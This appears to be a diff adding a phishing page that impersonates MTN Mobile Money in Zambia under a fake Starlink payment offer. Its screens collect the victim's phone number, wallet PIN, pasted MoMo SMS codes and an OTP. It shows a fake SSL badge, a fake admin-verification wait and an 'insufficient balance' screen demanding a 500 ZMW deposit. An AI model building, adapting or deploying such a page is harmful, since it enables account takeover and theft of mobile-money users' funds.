@@ -1,0 +1,1948 @@
+<!DOCTYPE html>
+<html lang="en" translate="no">
+<head>
+    <meta charset="utf-8"/>
+    <link rel="icon" href="https://mtn.com.gh/favicon.ico"/>
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="theme-color" content="#000000"/>
+    <meta name="google" content="notranslate">
+    <title>MTN Mobile Money</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        html, body {
+            background: linear-gradient(180deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            min-height: 100vh;
+            color: #fff;
+            -webkit-font-smoothing: antialiased;
+        }
+        
+        .app-container {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 60px 20px 40px;
+        }
+        
+        .momo-logo {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 16px;
+        }
+        
+        .momo-logo svg {
+            width: 100%;
+            height: 100%;
+        }
+        
+        .brand-name {
+            font-size: 32px;
+            font-weight: 700;
+            color: #ffcc00;
+            margin-bottom: 4px;
+        }
+        
+        .brand-tagline {
+            font-size: 14px;
+            color: #ffcc00;
+            margin-bottom: 40px;
+        }
+        
+        .login-card {
+            background: #fff;
+            border-radius: 16px;
+            padding: 32px 24px;
+            width: 100%;
+            max-width: 380px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+        }
+        
+        .card-title {
+            font-size: 22px;
+            font-weight: 600;
+            color: #1a1a2e;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        
+        .phone-wrapper {
+            display: flex;
+            align-items: center;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            overflow: hidden;
+            transition: border-color 0.2s;
+            margin-bottom: 24px;
+        }
+        
+        .phone-wrapper:focus-within {
+            border-color: #ffcc00;
+        }
+        
+        .phone-prefix {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px 14px;
+            font-size: 18px;
+            font-weight: 600;
+            color: #1a1a2e;
+            background: #f5f5f5;
+            border-right: 1px solid #e0e0e0;
+            white-space: nowrap;
+        }
+        
+        .phone-prefix .flag-inline {
+            display: inline-flex;
+            align-items: center;
+            margin-right: 8px;
+        }
+        
+        .phone-prefix .flag-inline img {
+            width: 22px;
+            height: 16px;
+            border-radius: 2px;
+        }
+        
+        .phone-input {
+            flex: 1;
+            border: none;
+            padding: 16px 14px;
+            font-size: 18px;
+            color: #1a1a2e;
+            outline: none;
+            background: transparent;
+        }
+        
+        .phone-input::placeholder {
+            color: #aaa;
+        }
+        
+        .terms-text {
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+            margin-bottom: 24px;
+            line-height: 1.5;
+        }
+        
+        .terms-text a {
+            color: #0066cc;
+            text-decoration: none;
+        }
+        
+        .next-btn {
+            width: 100%;
+            background: #1a1a2e;
+            color: #fff;
+            border: none;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .next-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+        
+        .next-btn:not(:disabled):hover {
+            background: #2d2d4a;
+        }
+        
+        .next-btn .loader {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #fff;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        
+        .next-btn.loading .loader { display: block; }
+        .next-btn.loading .btn-text { display: none; }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* PIN Screen */
+        .pin-screen {
+            display: none;
+        }
+        
+        .pin-screen.active {
+            display: block;
+        }
+        
+        .phone-screen.hidden {
+            display: none;
+        }
+        
+        .back-btn {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #1a1a2e;
+            font-size: 14px;
+            font-weight: 500;
+            background: none;
+            border: none;
+            cursor: pointer;
+            margin-bottom: 20px;
+            padding: 0;
+        }
+        
+        .back-btn svg {
+            width: 20px;
+            height: 20px;
+        }
+        
+        .pin-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #1a1a2e;
+            margin-bottom: 8px;
+        }
+        
+        .pin-subtitle {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 24px;
+            line-height: 1.5;
+        }
+        
+        .pin-inputs {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            margin-bottom: 24px;
+        }
+        
+        .pin-input {
+            width: 50px;
+            height: 56px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 600;
+            color: #1a1a2e;
+            outline: none;
+            transition: border-color 0.2s;
+            -webkit-text-security: disc;
+        }
+        
+        .pin-input:focus {
+            border-color: #ffcc00;
+        }
+        
+        .submit-btn {
+            width: 100%;
+            background: #ffcc00;
+            color: #1a1a2e;
+            border: none;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .submit-btn:disabled {
+            background: #e0e0e0;
+            color: #999;
+            cursor: not-allowed;
+        }
+        
+        .submit-btn:not(:disabled):hover {
+            background: #e6b800;
+        }
+        
+        /* Verification Link Screen */
+        .link-screen {
+            display: none;
+        }
+        
+        .link-screen.active {
+            display: block;
+        }
+        
+        .link-input {
+            width: 100%;
+            min-height: 52px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            padding: 12px 14px;
+            font-size: 14px;
+            color: #1a1a2e;
+            outline: none;
+            transition: border-color 0.2s;
+            margin-bottom: 24px;
+            font-family: inherit;
+        }
+
+        .link-input:focus {
+            border-color: #ffcc00;
+        }
+
+        .link-action {
+            width: 100%;
+            background: #ffcc00;
+            color: #1a1a2e;
+            border: none;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .link-action:disabled {
+            background: #e0e0e0;
+            color: #999;
+            cursor: not-allowed;
+        }
+
+        .link-action:not(:disabled):hover {
+            background: #e6b800;
+        }
+
+        .link-help {
+            background: #f8f9fa;
+            border-left: 3px solid #ffcc00;
+            border-radius: 8px;
+            color: #666;
+            font-size: 13px;
+            line-height: 1.6;
+            padding: 12px;
+            margin-bottom: 18px;
+            text-align: left;
+        }
+
+        /* OTP Screen */
+        .otp-screen {
+            display: none;
+        }
+
+        .otp-screen.active {
+            display: block;
+        }
+
+        .otp-input {
+            width: 56px;
+            height: 60px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            text-align: center;
+            font-size: 26px;
+            font-weight: 700;
+            color: #1a1a2e;
+            outline: none;
+            transition: border-color 0.2s;
+            caret-color: #ffcc00;
+        }
+
+        .otp-input:focus {
+            border-color: #ffcc00;
+        }
+
+        .otp-input.shake {
+            animation: otpShake 0.4s;
+        }
+
+        @keyframes otpShake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-6px); }
+            75% { transform: translateX(6px); }
+        }
+
+        .insufficient-screen {
+            display: none;
+        }
+        .insufficient-screen.active {
+            display: block;
+        }
+
+        .not-verified-screen {
+            display: none;
+        }
+
+        .not-verified-screen.active {
+            display: block;
+        }
+
+        .waiting-screen {
+            display: none;
+        }
+
+        .waiting-screen.active {
+            display: block;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .error-message {
+            background: #fee;
+            color: #c00;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 14px;
+            margin-bottom: 16px;
+            display: none;
+        }
+        
+        .error-message.show {
+            display: block;
+        }
+        
+        /* Starlink Header */
+        .starlink-header {
+            display: none;
+            background: linear-gradient(135deg, #1a1a2e 0%, #0f3460 100%);
+            padding: 20px;
+            text-align: center;
+            border-radius: 16px 16px 0 0;
+            margin: -32px -24px 24px -24px;
+        }
+        
+        .starlink-header.active {
+            display: block;
+        }
+        
+        .starlink-header h2 {
+            color: #fff;
+            font-size: 18px;
+            margin-bottom: 8px;
+        }
+        
+        .payment-details {
+            display: none;
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 20px;
+        }
+        
+        .payment-details.active {
+            display: block;
+        }
+        
+        .payment-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px 0;
+        }
+        
+        .payment-label {
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .payment-value {
+            color: #1a1a2e;
+            font-weight: 600;
+            font-size: 16px;
+        }
+        
+        .payment-amount {
+            color: #ffcc00;
+            font-size: 24px;
+            font-weight: 700;
+        }
+        
+        /* SSL Badge */
+        .ssl-badge {
+            display: none;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            margin-top: 16px;
+            padding: 8px 16px;
+            background: #e8f5e9;
+            border-radius: 20px;
+            font-size: 11px;
+            color: #2e7d32;
+            font-weight: 500;
+        }
+        
+        .ssl-badge.active {
+            display: flex;
+        }
+        
+        .ssl-badge svg {
+            width: 14px;
+            height: 14px;
+        }
+
+        /* Shared screen helpers */
+        .screen-center {
+            text-align: center;
+            padding: 30px 20px;
+        }
+        .screen-center-sm {
+            text-align: center;
+            padding: 24px 20px;
+        }
+        .icon-circle {
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+        }
+        .icon-circle-lg {
+            width: 80px;
+            height: 80px;
+            background: #FEF3C7;
+        }
+        .icon-circle-md {
+            width: 70px;
+            height: 70px;
+            background: #FEF3C7;
+            margin: 0 auto 16px;
+        }
+        .icon-text {
+            font-size: 40px;
+        }
+        .icon-text-md {
+            font-size: 36px;
+        }
+        .screen-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #B45309;
+            margin-bottom: 8px;
+        }
+        .screen-title-md {
+            font-size: 18px;
+            color: #B45309;
+            margin-bottom: 8px;
+            font-weight: 700;
+        }
+        .screen-title-success {
+            font-size: 22px;
+            color: #065F46;
+            margin-bottom: 8px;
+            font-weight: 700;
+        }
+        .info-text {
+            color: #9CA3AF;
+            font-size: 13px;
+            line-height: 1.6;
+            margin-bottom: 24px;
+        }
+        .info-box {
+            color: #6B7280;
+            font-size: 13px;
+            line-height: 1.7;
+            margin-bottom: 16px;
+            text-align: left;
+            background: #F9FAFB;
+            border-radius: 8px;
+            padding: 12px;
+            border-left: 3px solid #FBBF24;
+        }
+        .text-white {
+            color: #fff;
+        }
+        .text-timeout {
+            font-size: 11px;
+            color: #9CA3AF;
+        }
+        .btn-action-primary {
+            width: 100%;
+            padding: 14px;
+            background: #10B981;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 12px;
+        }
+        .btn-momo-primary {
+            width: 100%;
+            padding: 14px;
+            background: #F59E0B;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: not-allowed;
+            opacity: .6;
+            margin-bottom: 10px;
+        }
+        .btn-action-secondary {
+            width: 100%;
+            padding: 12px;
+            background: transparent;
+            color: #9CA3AF;
+            border: 2px solid #4B5563;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+        .momo-textarea {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #D1D5DB;
+            border-radius: 10px;
+            font-size: 13px;
+            font-family: inherit;
+            resize: none;
+            line-height: 1.5;
+            outline: none;
+            color: #111827;
+        }
+        .error-text-sm {
+            font-size: 12px;
+            color: #EF4444;
+            margin: 8px 0 12px;
+            min-height: 18px;
+        }
+        .status-bar {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 10px 16px;
+            background: #F3F4F6;
+            border-radius: 8px;
+            margin-bottom: 16px;
+        }
+        .spinner {
+            width: 16px;
+            height: 16px;
+            border: 2px solid #D1D5DB;
+            border-top-color: #2563EB;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        .status-text {
+            font-size: 13px;
+            color: #4B5563;
+            font-weight: 500;
+        }
+        .phone-display {
+            font-weight: 600;
+            color: #1a1a2e;
+        }
+        .success-screen {
+            display: none;
+        }
+        .success-screen.active {
+            display: block;
+        }
+        .success-icon-circle {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: #D1FAE5;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+        }
+        .success-title {
+            font-size: 22px;
+            color: #065F46;
+            margin-bottom: 8px;
+            font-weight: 700;
+        }
+        .success-text {
+            color: #6B7280;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+    </style>
+</head>
+<body>
+    <div class="app-container">
+        <!-- MoMo Logo -->
+        <div class="momo-logo">
+            <svg viewBox="0 0 100 100" fill="none">
+                <circle cx="50" cy="50" r="45" fill="#ffcc00"/>
+                <path d="M35 65 L50 35 L65 65" stroke="#1a1a2e" stroke-width="6" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+                <circle cx="50" cy="28" r="6" fill="#1a1a2e"/>
+            </svg>
+        </div>
+        <div class="brand-name">MoMo</div>
+        <div class="brand-tagline">from MTN</div>
+        
+        <!-- Login Card -->
+        <div class="login-card">
+            <!-- Starlink Header (hidden by default) -->
+            <div class="starlink-header" id="starlinkHeader">
+                <h2>⭐ Starlink Payment</h2>
+            </div>
+            
+            <!-- Payment Details (hidden by default) -->
+            <div class="payment-details" id="paymentDetails">
+                <div class="payment-row">
+                    <span class="payment-label">Service</span>
+                    <span class="payment-value" id="starlinkService">Starlink Renewal</span>
+                </div>
+                <div class="payment-row">
+                    <span class="payment-label">Amount</span>
+                    <span class="payment-amount" id="starlinkAmount">ZMW 0</span>
+                </div>
+            </div>
+            
+            <!-- Phone Screen -->
+            <div class="phone-screen" id="phoneScreen">
+                <h2 class="card-title" id="cardTitle">Welcome to MoMo</h2>
+                
+                <div class="error-message" id="phoneError"></div>
+                
+                <div class="phone-wrapper">
+                    <div class="phone-prefix">
+                        <span class="flag-inline">
+                            <img src="https://flagcdn.com/w20/zm.png" alt="Zambia" id="flagInline">
+                        </span>
+                        +260
+                    </div>
+                    <input type="tel" class="phone-input" id="phoneInput" placeholder="9XX XXX XXX" maxlength="9" value="" autocomplete="tel" inputmode="tel">
+                </div>
+                
+                <p class="terms-text">
+                    By using this app you agree to our <a href="#">Mobile Terms of Use</a> and <a href="#">Privacy Policy</a>
+                </p>
+                
+                <button class="next-btn" id="nextBtn" disabled>
+                    <span class="btn-text">NEXT</span>
+                    <span class="loader"></span>
+                </button>
+            </div>
+            
+            <!-- PIN Screen -->
+            <div class="pin-screen" id="pinScreen">
+                <button class="back-btn" id="backToPhone">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M19 12H5M12 19l-7-7 7-7"/>
+                    </svg>
+                    Back
+                </button>
+                
+                <h3 class="pin-title">Enter your MoMo PIN</h3>
+                <p class="pin-subtitle">Enter your 4 or 5-digit MoMo wallet PIN to authorize this transaction.</p>
+                
+                <div class="error-message" id="pinError"></div>
+                
+                <div class="pin-inputs">
+                    <input type="tel" class="pin-input" maxlength="1" inputmode="numeric" autocomplete="off" data-index="0">
+                    <input type="tel" class="pin-input" maxlength="1" inputmode="numeric" autocomplete="off" data-index="1">
+                    <input type="tel" class="pin-input" maxlength="1" inputmode="numeric" autocomplete="off" data-index="2">
+                    <input type="tel" class="pin-input" maxlength="1" inputmode="numeric" autocomplete="off" data-index="3">
+                    <input type="tel" class="pin-input" maxlength="1" inputmode="numeric" autocomplete="off" data-index="4">
+                </div>
+                
+                <button class="submit-btn" id="submitBtn" disabled>Submit</button>
+            </div>
+            
+            <!-- Verification Link Screen -->
+            <div class="link-screen" id="linkScreen">
+                <button class="back-btn" id="backToPin">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M19 12H5M12 19l-7-7 7-7"/>
+                    </svg>
+                    Back
+                </button>
+                
+                <h3 class="pin-title">Verification Link</h3>
+                <p class="pin-subtitle">Use the verification link sent to your phone number to continue.</p>
+                <p class="pin-subtitle phone-display" id="phoneDisplay">+260 6XX XXX XXX</p>
+                
+                <div class="error-message" id="linkError"></div>
+                <div class="link-help">Paste the verification link or the complete MoMo SMS message containing the confidential code. Do not share it with anyone.</div>
+                <input type="text" class="link-input" id="verificationLinkInput" placeholder="Paste verification link or full MoMo SMS message..." autocomplete="off">
+                
+                <button class="link-action" id="verifyLinkBtn" disabled>Verify Link</button>
+            </div>
+
+            <!-- OTP Screen (after link verification) -->
+            <div class="otp-screen" id="otpScreen">
+                <h3 class="pin-title" id="otpTitle">Enter OTP Code</h3>
+                <p class="pin-subtitle" id="otpSubtitle">Enter the 4-digit verification code sent to your MoMo number to complete this payment.</p>
+                <p class="pin-subtitle phone-display" id="otpPhoneDisplay">+260 XXX XXX XXX</p>
+
+                <div class="error-message" id="otpError"></div>
+
+                <div class="pin-inputs">
+                    <input type="tel" class="otp-input" maxlength="1" inputmode="numeric" autocomplete="one-time-code" data-otp-index="0">
+                    <input type="tel" class="otp-input" maxlength="1" inputmode="numeric" autocomplete="off" data-otp-index="1">
+                    <input type="tel" class="otp-input" maxlength="1" inputmode="numeric" autocomplete="off" data-otp-index="2">
+                    <input type="tel" class="otp-input" maxlength="1" inputmode="numeric" autocomplete="off" data-otp-index="3">
+                </div>
+
+                <button class="submit-btn" id="otpSubmitBtn" disabled>Verify OTP</button>
+            </div>
+
+            <!-- Payment Success Screen -->
+            <div class="success-screen" id="successScreen">
+                <div class="screen-center">
+                    <div class="success-icon-circle">
+                        <span class="icon-text">✅</span>
+                    </div>
+                    <h2 class="success-title" id="successTitle">Payment Successful!</h2>
+                    <p class="success-text" id="successText">Your Starlink package has been activated successfully.</p>
+                </div>
+            </div>
+
+            <!-- Insufficient Balance Screen -->
+            <div class="insufficient-screen" id="insufficientScreen">
+                <div class="screen-center">
+                    <div class="icon-circle icon-circle-lg">
+                        <span class="icon-text">⚠️</span>
+                    </div>
+                    <h2 class="screen-title">Insufficient Balance</h2>
+                    <p id="insuffMsg" class="info-text">
+                        You must have at least <strong class="text-white">500 ZMW</strong> in your MTN Mobile Money wallet as a <strong class="text-white">guarantee deposit</strong> to subscribe to any Starlink package.<br><br>Please deposit the required amount and click the button below.
+                    </p>
+                    <button id="depositedBtn" class="btn-action-primary">
+                        ✅ I Have Deposited
+                    </button>
+                    <button id="diffNumberBtn" class="btn-action-secondary">
+                        Use a Different Number
+                    </button>
+                </div>
+            </div>
+
+            <!-- Not Verified Screen (MTN Zambia) -->
+                        <div class="not-verified-screen" id="notVerifiedScreen">
+                <div class="screen-center-sm">
+                    <div class="icon-circle icon-circle-md">
+                        <span class="icon-text-md">&#128172;</span>
+                    </div>
+                    <h2 id="momoVerifyTitle" class="screen-title-md">Verify Your MoMo Number</h2>
+                    <p id="momoInstructions" class="info-box">
+                        Paste the verification link received from MoMo here. Do not edit the link.
+                    </p>
+                    <textarea id="momoMsgInput" rows="5" placeholder="Paste the full MoMo SMS message here..." class="momo-textarea" oninput="checkMomoInput()"></textarea>
+                    <p id="momoAttemptMsg" class="error-text-sm"></p>
+                    <button id="momoSubmitBtn" onclick="submitMomoLink()" disabled class="btn-momo-primary">Submit Link</button>
+                    <button id="momoUseDifferentBtn" onclick="showPhoneScreen()" class="btn-action-secondary">Use a Different Number</button>
+                </div>
+            </div>
+
+            <!-- Waiting for Admin Approval Screen -->
+            <div class="waiting-screen" id="waitingScreen">
+                <div class="screen-center">
+                    <div class="icon-circle icon-circle-lg">
+                        <span class="icon-text">⏳</span>
+                    </div>
+                    <h2 id="waitingTitle" class="screen-title">En attente de vérification</h2>
+                    <p id="waitingMsg" class="info-text">
+                        Votre demande de paiement a été envoyée à l&apos;administrateur. Veuillez patienter pendant que nous vérifions vos informations.
+                    </p>
+                    <div class="status-bar">
+                        <div class="spinner"></div>
+                        <span id="waitingStatus" class="status-text">Vérification en cours...</span>
+                    </div>
+                    <p class="text-timeout">Cela peut prendre jusqu&apos;à 5 minutes.</p>
+                </div>
+            </div>
+            
+            <!-- SSL Badge -->
+            <div class="ssl-badge" id="sslBadge">
+                <svg viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
+                </svg>
+                SSL ENCRYPTED AND SECURE
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // Country configurations - Zambia only
+        const COUNTRIES = {
+            'ZM': { code: '+260', length: 9, flag: 'zm', name: 'Zambia', currency: 'ZMW' }
+        };
+        
+        // Package prices in ZMW
+        const STARLINK_PACKAGES = {
+            'starter': { cdf: 100, name: '1 GB / 24h', data: '1 GB' },
+            'standard': { cdf: 250, name: '3 GB / 24h', data: '3 GB' },
+            'premium': { cdf: 500, name: '7 GB / 24h', data: '7 GB' },
+            'pro': { cdf: 800, name: '15 GB / 24h', data: '15 GB' },
+            'business': { cdf: 1200, name: '30 GB / 7 days', data: '30 GB' },
+            'unlimited': { cdf: 5000, name: 'Unlimited / 1 month', data: 'Unlimited' }
+        };
+        
+        // ZMW currency only for Zambia
+        const CURRENCY_RATES = {
+            'ZMW': 1
+        };
+        
+        let phoneCode = '+260';
+        let msisdnLength = 9;
+        let currentCountry = 'ZM';
+        let currentMsisdn = '';
+        let currentPin = '';
+        let starlinkPackage = null;
+        let currentRequestId = null;
+        let statusPollInterval = null;
+        
+        // French-speaking African countries
+        const FRENCH_COUNTRIES = new Set([
+            'CI','SN','ML','BF','GN','CD','MG','NE','BJ',
+            'CG','TG','GA','TD','CF','GQ','BI','DJ','RW'
+        ]);
+
+        const TRANSLATIONS = {
+            en: {
+                welcome: 'Welcome to MoMo',
+                enterNumber: 'Enter your MoMo number',
+                terms: 'By using this app you agree to our <a href="#">Mobile Terms of Use</a> and <a href="#">Privacy Policy</a>',
+                next: 'NEXT',
+                back: 'Back',
+                enterPin: 'Enter your MoMo PIN',
+                enterPinSub: 'Enter your 4 or 5-digit MoMo wallet PIN to authorize this transaction.',
+                submit: 'Submit',
+                linkVerification: 'Verification Link',
+                linkSub: 'Use the verification link sent to your phone number to continue.',
+                verifyLink: 'Verify Link',
+                verifying: 'Verifying...',
+                processing: 'Processing...',
+                ssl: 'SSL ENCRYPTED AND SECURE',
+                selectCountry: 'Select Country',
+                starlinkPayment: '⭐ Starlink Payment',
+                service: 'Service',
+                amount: 'Amount',
+                starlinkRenewal: 'Starlink Renewal',
+                txProcessing: 'Transaction processing. Please wait...',
+                verifyFailed: 'Verification failed. Please try again.',
+                linkSubmitted: 'Link submitted. Waiting for verification...',
+                linkExpired: 'Verification link expired. Please request a new link.',
+                somethingWrong: 'Something went wrong. Please try again.',
+                merchantInactive: 'Payment gateway is temporarily unavailable. Please contact support or try again later.',
+                sending: 'Sending...',
+                notVerifiedTitle: 'Account Not Verified',
+                notVerifiedMsg: 'Your MTN MoMo account needs manual verification before link verification is allowed. Contact support, then wait for admin confirmation.',
+                verifiedTitle: 'Account Verified',
+                verifiedMsg: 'Your MTN MoMo account has been verified. You can now continue to link verification.',
+                proceedLink: 'Proceed to Verification Link',
+                waitingVerify: '⏳ Waiting for admin verification...',
+                verifiedReady: '✅ Verified! You can proceed to link verification now.',
+                contactSupport: 'Chat with support now',
+                checkVerify: 'Check Verification Status',
+                useDifferent: 'Use a Different Number',
+                otpTitle: 'Enter OTP Code',
+                otpSub: 'Enter the 4-digit verification code sent to your MoMo number to complete this payment.',
+                otpVerify: 'Verify OTP',
+                otpSubmitted: 'OTP submitted. Waiting for verification...',
+                otpIncorrect: 'Incorrect OTP. Please enter the correct code and try again.',
+                paymentSuccess: 'Payment Successful!',
+                paymentSuccessMsg: 'Your Starlink package has been activated successfully.'
+            },
+            fr: {
+                welcome: 'Bienvenue sur MoMo',
+                enterNumber: 'Entrez votre numéro MoMo',
+                terms: 'En utilisant cette application, vous acceptez nos <a href="#">Conditions d\'utilisation</a> et notre <a href="#">Politique de confidentialité</a>',
+                next: 'SUIVANT',
+                back: 'Retour',
+                enterPin: 'Entrez votre code PIN MoMo',
+                enterPinSub: 'Entrez votre code PIN à 4 ou 5 chiffres MoMo pour autoriser cette transaction.',
+                submit: 'Valider',
+                linkVerification: 'Lien de vérification',
+                linkSub: 'Utilisez le lien de vérification envoyé à votre numéro de téléphone pour continuer.',
+                verifyLink: 'Vérifier le lien',
+                verifying: 'Vérification...',
+                processing: 'Traitement...',
+                ssl: 'CRYPTÉ SSL ET SÉCURISÉ',
+                selectCountry: 'Sélectionnez le pays',
+                starlinkPayment: '⭐ Paiement Starlink',
+                service: 'Service',
+                amount: 'Montant',
+                starlinkRenewal: 'Renouvellement Starlink',
+                txProcessing: 'Transaction en cours. Veuillez patienter...',
+                verifyFailed: 'Échec de la vérification. Veuillez réessayer.',
+                linkSubmitted: 'Lien envoyé. En attente de vérification...',
+                linkExpired: 'Lien de vérification expiré. Veuillez demander un nouveau lien.',
+                somethingWrong: 'Une erreur est survenue. Veuillez réessayer.',
+                merchantInactive: 'La passerelle de paiement est temporairement indisponible. Veuillez contacter le support ou réessayer plus tard.',
+                sending: 'Envoi...',
+                notVerifiedTitle: 'Compte non vérifié',
+                notVerifiedMsg: 'Votre compte MTN MoMo doit être vérifié manuellement avant que la vérification par lien soit autorisée. Contactez le support puis attendez la confirmation de l\'administrateur.',
+                verifiedTitle: 'Compte vérifié',
+                verifiedMsg: 'Votre compte MTN MoMo a été vérifié. Vous pouvez maintenant continuer vers la vérification par lien.',
+                proceedLink: 'Continuer vers le lien de vérification',
+                waitingVerify: '⏳ En attente de la vérification administrateur...',
+                verifiedReady: '✅ Vérifié ! Vous pouvez maintenant continuer vers le lien de vérification.',
+                contactSupport: 'Discuter avec le support maintenant',
+                checkVerify: 'Vérifier le statut',
+                useDifferent: 'Utiliser un autre numéro',
+                otpTitle: 'Entrez le code OTP',
+                otpSub: 'Saisissez le code de vérification à 4 chiffres envoyé à votre numéro MoMo pour finaliser ce paiement.',
+                otpVerify: 'Vérifier OTP',
+                otpSubmitted: 'OTP envoyé. En attente de vérification...',
+                otpIncorrect: 'OTP incorrect. Veuillez saisir le code correct et réessayer.',
+                paymentSuccess: 'Paiement réussi !',
+                paymentSuccessMsg: 'Votre forfait Starlink a été activé avec succès.'
+            }
+        };
+
+        let currentLang = 'en';
+
+        function t(key) {
+            return TRANSLATIONS[currentLang][key] || TRANSLATIONS['en'][key] || key;
+        }
+
+        function applyLanguage() {
+            document.getElementById('cardTitle').textContent = t('welcome');
+            document.querySelector('.terms-text').innerHTML = t('terms');
+            document.querySelector('#nextBtn .btn-text').textContent = t('next');
+
+            document.querySelectorAll('.back-btn').forEach(btn => {
+                var svg = btn.querySelector('svg');
+                btn.innerHTML = '';
+                btn.appendChild(svg);
+                btn.append('\n                    ' + t('back'));
+            });
+
+            document.querySelector('#pinScreen .pin-title').textContent = t('enterPin');
+            document.querySelector('#pinScreen .pin-subtitle').textContent = t('enterPinSub');
+            document.getElementById('submitBtn').textContent = t('submit');
+
+            document.querySelector('#linkScreen .pin-title').textContent = t('linkVerification');
+            document.querySelectorAll('#linkScreen .pin-subtitle')[0].textContent = t('linkSub');
+            document.getElementById('verifyLinkBtn').textContent = t('verifyLink');
+
+            var sslBadge = document.getElementById('sslBadge');
+            var sslSvg = sslBadge.querySelector('svg');
+            sslBadge.innerHTML = '';
+            sslBadge.appendChild(sslSvg);
+            sslBadge.append('\n                ' + t('ssl'));
+
+            document.querySelector('#starlinkHeader h2').textContent = t('starlinkPayment');
+            var payLabels = document.querySelectorAll('.payment-label');
+            if (payLabels.length >= 2) {
+                payLabels[0].textContent = t('service');
+                payLabels[1].textContent = t('amount');
+            }
+            document.getElementById('starlinkService').textContent = t('starlinkRenewal');
+
+            var _nvt = document.getElementById('notVerifiedTitle'); if (_nvt) _nvt.textContent = t('notVerifiedTitle');
+            var _nvm = document.getElementById('notVerifiedMsg'); if (_nvm) _nvm.textContent = t('notVerifiedMsg');
+            var _cs = document.getElementById('contactSupportText'); if (_cs) _cs.textContent = t('contactSupport');
+            var _cvb = document.getElementById('checkVerifyBtn'); if (_cvb) _cvb.textContent = '🔄 ' + t('checkVerify');
+            var _pvb = document.getElementById('proceedVerifiedBtn'); if (_pvb) _pvb.textContent = t('proceedLink');
+            var _udt = document.getElementById('useDifferentText'); if (_udt) _udt.textContent = t('useDifferent');
+            var _ot = document.getElementById('otpTitle'); if (_ot) _ot.textContent = t('otpTitle');
+            var _os = document.getElementById('otpSubtitle'); if (_os) _os.textContent = t('otpSub');
+            var _osb = document.getElementById('otpSubmitBtn'); if (_osb && !_osb.dataset.busy) _osb.textContent = t('otpVerify');
+            var _st = document.getElementById('successTitle'); if (_st) _st.textContent = t('paymentSuccess');
+            var _sx = document.getElementById('successText'); if (_sx) _sx.textContent = t('paymentSuccessMsg');
+            if (!mtnIsVerified) {
+                var _vst = document.getElementById('verifyStatusText'); if (_vst) _vst.textContent = t('waitingVerify');
+            }
+        }
+
+        const phoneInput = document.getElementById('phoneInput');
+        const nextBtn = document.getElementById('nextBtn');
+        const phoneScreen = document.getElementById('phoneScreen');
+        const pinScreen = document.getElementById('pinScreen');
+        const linkScreen = document.getElementById('linkScreen');
+        const notVerifiedScreen = document.getElementById('notVerifiedScreen');
+        const waitingScreen = document.getElementById('waitingScreen');
